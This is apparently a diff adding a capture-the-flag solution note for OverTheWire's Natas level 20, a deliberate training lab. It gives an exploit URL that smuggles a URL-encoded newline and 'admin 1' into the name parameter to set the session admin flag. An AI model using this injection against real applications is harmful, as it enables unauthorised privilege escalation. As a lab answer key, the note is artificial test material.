@@ -1,0 +1,2 @@
+http://natas20.natas.labs.overthewire.org/index.php?debug&name=natas21%0Aadmin%201
+Code injection via unsanitized name parameter with url encoding, can set $_SESSION["admin"] to 1 in addition to $_SESSION["name"] to arbitrary string.
